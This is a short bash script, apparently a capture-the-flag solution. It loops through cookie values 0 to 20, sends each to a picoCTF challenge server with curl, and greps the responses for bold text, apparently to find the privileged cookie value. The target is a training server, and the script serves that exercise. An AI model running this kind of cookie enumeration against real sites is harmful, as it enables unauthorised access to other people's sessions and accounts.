#!/bin/bash
for i in `seq 0 20`;
do
    echo -n $i
    curl --cookie "name=$i" --data "name=snickerdoodle" --silent -L http://mercury.picoctf.net:17781/search | grep "<b>"
done